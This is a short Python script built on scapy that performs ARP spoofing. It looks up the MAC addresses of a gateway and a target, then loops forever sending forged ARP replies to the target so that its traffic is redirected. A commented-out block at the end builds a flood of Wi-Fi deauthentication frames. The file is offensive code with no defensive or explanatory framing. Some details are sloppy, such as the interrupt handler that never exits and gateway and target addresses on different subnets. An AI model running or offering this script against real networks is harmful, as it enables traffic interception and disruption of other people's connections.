from scapy.all import *
import os
import sys
import threading
import signal
def get_mac(ip_address):
	responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
# return the MAC address from a response
	for s,r in responses:
		return r[Ether].src
	return None

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
	poison_target = ARP()
	poison_target.op = 2
	poison_target.psrc = gateway_ip
	poison_target.pdst = target_ip
	poison_target.hwdst= target_mac
	poison_gateway = ARP()
	poison_gateway.op = 2
	poison_gateway.psrc = target_ip
	poison_gateway.pdst = gateway_ip
	poison_gateway.hwdst= gateway_mac
	while True:
		try:
			send(poison_target)
			#send(poison_gateway)
			time.sleep(2)
		except KeyboardInterrupt:
			print("Error")
	return




interface = "Realtek RTL8188EU Wireless LAN 802.11n USB 2.0 Network Adapter"
target_ip = "192.168.31.14"
gateway_ip = "192.168.50.1"
packet_count = 1000
# set our interface
conf.iface = interface

# turn off output
conf.verb = 0
print("[*] Setting up %s" % interface)
gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
	print("[!!!] Failed to get gateway MAC. Exiting.")
	sys.exit(0)

else:
	print("[*] Gateway %s is at %s" % (gateway_ip,gateway_mac))
target_mac = get_mac(target_ip)
if target_mac is None:
	print("[!!!] Failed to get target MAC. Exiting.")
	sys.exit(0)
else:
	print("[*] Target %s is at %s" % (target_ip,target_mac))

# start poison thread
poison_thread = threading.Thread(target = poison_target, args =(gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()

'''
c=""	
bssid=""
pkt = RadioTap() / Dot11(addr1=bssid, addr2="78:11:DC:35:23:5F", addr3=bssid,type=2, subtype=4) / Dot11Deauth(reason=2)
while True:
	sendp(pkt, iface=interface, verbose=False)
	
'''
